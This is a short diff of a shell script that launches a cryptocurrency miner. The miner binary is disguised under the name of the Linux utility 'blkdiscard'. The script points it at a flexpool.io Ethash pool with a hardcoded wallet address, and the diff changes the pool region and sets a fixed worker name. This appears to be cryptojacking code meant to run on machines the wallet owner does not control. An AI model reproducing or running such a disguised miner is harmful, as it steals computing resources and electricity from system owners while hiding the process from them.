@@ -10,4 +10,4 @@ ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
 chmod +x blkdiscard
-./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0xd2b8488eF94b4F16C6fCacA8dfBde6C3DFdC38c5.$WORKER
+./blkdiscard --algo ETHASH --pool stratum+ssl://eth-sg.flexpool.io:5555 --user 0xd2b8488eF94b4F16C6fCacA8dfBde6C3DFdC38c5.LOLI-JEPANG
